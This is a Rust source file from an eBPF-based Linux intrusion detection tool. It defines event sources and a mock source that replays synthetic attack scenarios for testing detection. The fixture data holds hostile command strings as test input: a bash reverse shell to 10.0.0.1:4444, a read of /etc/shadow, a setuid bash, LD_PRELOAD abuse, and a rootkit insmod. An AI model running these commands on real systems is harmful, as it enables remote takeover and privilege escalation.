//! 事件源抽象 — 统一 eBPF ring buffer、mock、文件回放的数据获取接口。
//!
//! A6 重构：
//! - trait 改为 async（next_bytes 返回 Future，避免 perfbuf/inotify 阻塞 tokio reactor）
//! - 删 Sync 约束（RingBuf 是 Send 但不是 Sync；强加 Sync 会逼出 Mutex<RingBuf> 损失性能）
//! - 加 SourceKind enum，用于运行时多态 + 配置展示 + 日志区分

use anyhow::Result;
use async_trait::async_trait;
use ks_core::event::{EventHeader, ExecEvent, FileEvent, NetEvent, SignalEvent, af};

/// 事件源种类。
///
/// 与多 tier eBPF 架构对应：Modern (5.8+ ringbuf) / Legacy (4.x perfbuf) /
/// Ancient (3.10+ BTF backport)。Mock/FileReplay 用于测试与离线分析。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceKind {
    /// 现代 eBPF tier（5.8+，BPF_MAP_TYPE_RINGBUF）
    EbpfModern,
    /// Legacy eBPF tier（4.x，BPF_MAP_TYPE_PERF_EVENT_ARRAY）— Phase B 实现
    EbpfLegacy,
    /// Ancient eBPF tier（3.10.0-1160+ BTF backport，HASH + 手动 LRU）— Phase C 研究性突破
    EbpfAncient,
    /// Mock 回放（测试/演示/CI 用）
    Mock,
    /// 文件回放（离线 pcap/jsonl 日志重放）— 未来扩展
    FileReplay,
}

impl SourceKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            SourceKind::EbpfModern  => "eBPF-Modern (5.8+ ringbuf)",
            SourceKind::EbpfLegacy  => "eBPF-Legacy (4.x perfbuf)",
            SourceKind::EbpfAncient => "eBPF-Ancient (3.10+ BTF backport)",
            SourceKind::Mock        => "Mock 回放",
            SourceKind::FileReplay  => "文件回放",
        }
    }
}

/// 统一事件源 trait。
///
/// 设计要点：
/// - `Send` 不 `Sync`：RingBuf<MapData> 是 Send 但不是 Sync，强加 Sync 会逼出
///   `Mutex<RingBuf>` 包装，每次 next_bytes 都 lock，无意义损失性能。
///   去掉 Sync 后 `Box<dyn EventSource>` 不能跨 await share ref，但本架构里
///   每个事件源由单 task 独占持有，无需跨 task 共享，删 Sync 安全。
/// - `async` next_bytes：未来 Phase B 的 perfbuf / FileReplay 可能需 await
///   epoll/AsyncFd，trait 一开始就 async 避免后续破坏性改动。
#[async_trait]
pub trait EventSource: Send {
    /// 取下一条事件字节。Ok(None) 表示暂无数据（非错误，调用方应 sleep）。
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;

    /// 来源种类（用于运行时多态与日志展示）。
    fn kind(&self) -> SourceKind;

    /// 人类可读描述（含 tier、ringbuf 名等细节）。
    fn description(&self) -> &str;

    /// 是否为 mock（用于跳过告警上报等）。
    fn is_mock(&self) -> bool {
        matches!(self.kind(), SourceKind::Mock)
    }
}

// ========== Mock 事件源 ==========

pub struct MockEventSource {
    events: Vec<Vec<u8>>,
    cursor: usize,
    loop_mode: bool,
}

impl MockEventSource {
    pub fn new_with_all_scenarios() -> Self {
        let base_ns: u64 = 100_000_000_000;
        let mut events = Vec::new();
        events.extend(Self::reverse_shell_scenario(base_ns));
        events.extend(Self::ransomware_scenario(base_ns + 60_000_000_000));
        events.extend(Self::privilege_escalation_scenario(base_ns + 120_000_000_000));
        events.extend(Self::dns_tunnel_scenario(base_ns + 180_000_000_000));
        events.extend(Self::rootkit_scenario(base_ns + 240_000_000_000));
        events.extend(Self::baseline_scenario(base_ns + 300_000_000_000));
        Self { events, cursor: 0, loop_mode: true }
    }

    pub fn new_with_scenario(scenario: MockScenario) -> Self {
        let base_ns: u64 = 100_000_000_000;
        let events = match scenario {
            MockScenario::ReverseShell => Self::reverse_shell_scenario(base_ns),
            MockScenario::Ransomware => Self::ransomware_scenario(base_ns),
            MockScenario::PrivilegeEscalation => Self::privilege_escalation_scenario(base_ns),
            MockScenario::DnsTunnel => Self::dns_tunnel_scenario(base_ns),
            MockScenario::Rootkit => Self::rootkit_scenario(base_ns),
            MockScenario::Baseline => Self::baseline_scenario(base_ns),
            MockScenario::All => Self::new_with_all_scenarios().events,
        };
        Self { events, cursor: 0, loop_mode: false }
    }

    pub fn with_loop(mut self, loop_mode: bool) -> Self { self.loop_mode = loop_mode; self }
    pub fn remaining(&self) -> usize { self.events.len() - self.cursor }

    fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 1234, base_ns, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 1234, base_ns + 100_000_000, b"bash", 42),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32("10.0.0.1"),
                sport: 54321, dport: 4444, proto: 6, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 1234, base_ns + 200_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/shadow"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&make_header(2, 1234, base_ns + 300_000_000, b"bash", 0)),
        ]
    }

    fn ransomware_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 5678;
        let mut events = vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"encryptor", 59),
                filename: make_cstr_256("/tmp/encryptor"),
                args: make_cstr_512("/tmp/encryptor --target /home/user/docs"),
            })
        ];
        for (i, fname) in ["report.pdf.encrypted", "budget.xlsx.encrypted", "img001.jpg.encrypted", "img002.jpg.encrypted"].iter().enumerate() {
            events.push(encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + (i as u64 + 1) * 50_000_000, b"encryptor", 1),
                filename: make_cstr_256(fname), bytes: 102400, fd: (i + 3) as i32, flags: 1,
            }));
        }
        for (i, fname) in ["report.pdf", "budget.xlsx", "img001.jpg", "img002.jpg"].iter().enumerate() {
            events.push(encode_struct(&FileEvent {
                header: make_header(13, pid, base_ns + (i as u64 + 5) * 50_000_000, b"encryptor", 87),
                filename: make_cstr_256(fname), bytes: 0, fd: 0, flags: 0,
            }));
        }
        events.push(encode_struct(&FileEvent {
            header: make_header(12, pid, base_ns + 500_000_000, b"encryptor", 1),
            filename: make_cstr_256("README_FOR_DECRYPT.txt"), bytes: 2048, fd: 11, flags: 1,
        }));
        events
    }

    fn privilege_escalation_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 3456;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"chmod", 59),
                filename: make_cstr_256("/bin/chmod"), args: make_cstr_512("chmod +s /bin/bash"),
            }),
            encode_struct(&FileEvent {
                header: make_header(15, pid, base_ns + 100_000_000, b"chmod", 15),
                filename: make_cstr_256("/bin/bash"), bytes: 0, fd: 0, flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/etc/sudoers"), bytes: 256, fd: 3, flags: 1,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, pid + 1, base_ns + 300_000_000, b"bash", 59),
                filename: make_cstr_256("/bin/bash"), args: make_cstr_512("LD_PRELOAD=/tmp/malicious.so /bin/su"),
            }),
            encode_struct(&SignalEvent {
                header: make_header(30, pid, base_ns + 400_000_000, b"strace", 101),
                target_pid: 1, signal: 0,
            }),
        ]
    }

    fn dns_tunnel_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 7890;
        let dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
        let mut events = vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"dnstunnel", 59),
                filename: make_cstr_256("/tmp/dnstunnel"), args: make_cstr_512("dnstunnel --client"),
            })
        ];
        for (i, dns) in dns_servers.iter().enumerate() {
            events.push(encode_struct(&NetEvent {
                header: make_header(24, pid, base_ns + (i as u64 + 1) * 1_000_000_000, b"dnstunnel", 0),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32(dns),
                sport: 12345 + i as u16, dport: 53, proto: 17, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }));
        }
        events
    }

    fn rootkit_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 9999;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"insmod", 59),
                filename: make_cstr_256("/sbin/insmod"), args: make_cstr_512("insmod /tmp/rootkit.ko"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, pid, base_ns + 100_000_000, b"insmod", 2),
                filename: make_cstr_256("/proc/kallsyms"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/boot/grub/grub.cfg"), bytes: 4096, fd: 4, flags: 1,
            }),
            encode_struct(&SignalEvent {
                header: make_header(31, pid, base_ns + 300_000_000, b"bash", 62),
                target_pid: 100, signal: 9,
            }),
        ]
    }

    fn baseline_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 5000, base_ns, b"ls", 59),
                filename: make_cstr_256("/bin/ls"), args: make_cstr_512("ls -la /home"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 5001, base_ns + 50_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/hosts"), bytes: 0, fd: 3, flags: 0,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, 5002, base_ns + 100_000_000, b"wget", 59),
                filename: make_cstr_256("/usr/bin/wget"), args: make_cstr_512("wget https://example.com/pkg.tar.gz"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 5002, base_ns + 150_000_000, b"wget", 42),
                saddr: ipv4_to_u32("192.168.1.100"), daddr: ipv4_to_u32("93.184.216.34"),
                sport: 54322, dport: 443, proto: 6, family: af::AF_INET,
                saddr6: [0u8; 16], daddr6: [0u8; 16], _pad3: [0u8; 2],
            }),
        ]
    }
}

#[async_trait]
impl EventSource for MockEventSource {
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>> {
        if self.cursor >= self.events.len() {
            if self.loop_mode { self.cursor = 0; } else { return Ok(None); }
        }
        let data = self.events[self.cursor].clone();
        self.cursor += 1;
        Ok(Some(data))
    }
    fn kind(&self) -> SourceKind { SourceKind::Mock }
    fn description(&self) -> &str { "mock 事件源（场景回放）" }
    fn is_mock(&self) -> bool { true }
}

// ========== Linux 真实事件源 (aya ring buffer) ==========
// 注意：LinuxEventSource 已简化为 stub。
// 真实 ring buffer 消费在 start.rs 中通过 loader.try_next_event() 直接调用。
// A7 会用 EbpfModernSource 替换此 stub，真正通过 trait 路由 eBPF 事件。

#[cfg(target_os = "linux")]
pub struct LinuxEventSource;

#[cfg(target_os = "linux")]
impl LinuxEventSource {
    pub fn new() -> Self { Self }
}

#[cfg(target_os = "linux")]
#[async_trait]
impl EventSource for LinuxEventSource {
    async fn next_bytes(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        // stub — 真实消费由 start.rs 绕过此 trait 直接调 loader。
        // A7 重构后由 EbpfModernSource 接管此职责。
        Ok(None)
    }
    fn kind(&self) -> SourceKind { SourceKind::EbpfModern }
    fn description(&self) -> &str { "Linux eBPF (stub — A7 替换中)" }
    fn is_mock(&self) -> bool { false }
}

// ========== 辅助函数 ==========

fn make_header(event_type: u32, pid: u32, ts: u64, comm: &[u8], nr: i32) -> EventHeader {
    let mut buf = [0u8; 16];
    let len = comm.len().min(16);
    buf[..len].copy_from_slice(&comm[..len]);
    EventHeader { event_type, _pad1: 0, timestamp_ns: ts, pid, tid: pid, uid: if pid < 5000 { 0 } else { 1000 }, ppid: if pid > 100 { pid / 10 } else { 0 }, comm: buf, syscall_nr: nr, _pad2: 0, retval: 0 }
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    // 与内核 bpf_probe_read_kernel 一致：网络字节序的字节直接拷入 u32 字段，
    // Rust 读出来是 native-endian。用 from_ne_bytes 匹配内核行为。
    let parts: Vec<u8> = addr.split('.').filter_map(|p| p.parse::<u8>().ok()).collect();
    if parts.len() == 4 { u32::from_ne_bytes([parts[0], parts[1], parts[2], parts[3]]) } else { 0 }
}

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    // 直接从引用拷贝到 Vec，避免 *s 在栈上产生大结构体副本（ExecEvent ~800B）
    unsafe { core::ptr::copy_nonoverlapping(s as *const T as *const u8, data.as_mut_ptr(), size); }
    data
}

#[derive(Debug, Clone, Copy)]
pub enum MockScenario {
    ReverseShell, Ransomware, PrivilegeEscalation, DnsTunnel, Rootkit, Baseline, All,
}

// ========== 平台导出 ==========

#[cfg(target_os = "linux")]
pub use linux_impl::*;
#[cfg(not(target_os = "linux"))]
pub use mock_only::*;

#[cfg(target_os = "linux")]
mod linux_impl {
    pub use super::{EventSource, MockEventSource, SourceKind};
    use crate::tier_detect::detect_ebpf_tier;
    use crate::ebpf_source::EbpfModernSource;
    use crate::loader::EbpfLoader;

    /// A8: 默认事件源 — 根据内核版本自动选择 eBPF tier。
    ///
    /// - 5.8+ → EbpfModernSource（加载 ks_main.o，attach 18 个程序）
    /// - 4.x  → mock + warning（Phase B 实现 EbpfLegacySource 后切换）
    /// - 3.10+ → mock + warning（Phase C 实现 EbpfAncientSource 后切换）
    /// - 太老/读不到版本 → mock + warning
    ///
    /// 调用方需 .await（因为 EbpfLoader::start_all 是 async）。
    pub async fn default_event_source() -> Box<dyn EventSource> {
        match detect_ebpf_tier() {
            Some(SourceKind::EbpfModern) => {
                log::info!("[tier-detect] 当前内核支持 Modern tier (5.8+ ringbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all().await {
                    Ok(_) => {
                        log::info!("[tier-detect] eBPF Modern tier 加载成功，{} 个程序已 attach",
                                   loader.loaded_probes().len());
                        return Box::new(EbpfModernSource::new(loader));
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Modern tier 加载失败: {} — fallback mock", e);
                    }
                }
                Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
            }
            Some(SourceKind::EbpfLegacy) => {
                log::warn!("[tier-detect] 检测到 4.x 内核，Legacy tier 尚未实现（Phase B），fallback mock");
                Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
            }
            Some(SourceKind::EbpfAncient) => {
                log::warn!("[tier-detect] 检测到 3.10+ 内核，Ancient tier 尚未实现（Phase C 研究性突破），fallback mock");
                Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
            }
            _ => {
                log::warn!("[tier-detect] 内核版本无法识别或太老，fallback mock");
                Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
            }
        }
    }
}

#[cfg(not(target_os = "linux"))]
mod mock_only {
    pub use super::{EventSource, MockEventSource};
    pub async fn default_event_source() -> Box<dyn EventSource> {
        Box::new(MockEventSource::new_with_all_scenarios().with_loop(true))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::aggregator::EventAggregator;

    #[tokio::test(flavor = "current_thread")]
    async fn test_mock_source_decodable() {
        let mut source = MockEventSource::new_with_all_scenarios().with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut n = 0;
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if agg.decode(&bytes).is_ok() { n += 1; }
        }
        assert!(n > 10);
    }

    #[tokio::test(flavor = "current_thread")]
    async fn test_reverse_shell_scenario() {
        let mut source = MockEventSource::new_with_scenario(MockScenario::ReverseShell).with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut events = Vec::new();
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if let Ok(e) = agg.decode(&bytes) { events.push(e); }
        }
        assert_eq!(events.len(), 4);
        assert_eq!(events[1].dport, Some(4444));
    }

    #[test]
    fn test_ipv4_encoding() {
        assert_eq!(ipv4_to_u32("8.8.8.8"), 0x08080808);
        assert_eq!(ipv4_to_u32("10.0.0.1"), u32::from_ne_bytes([10, 0, 0, 1]));
    }
}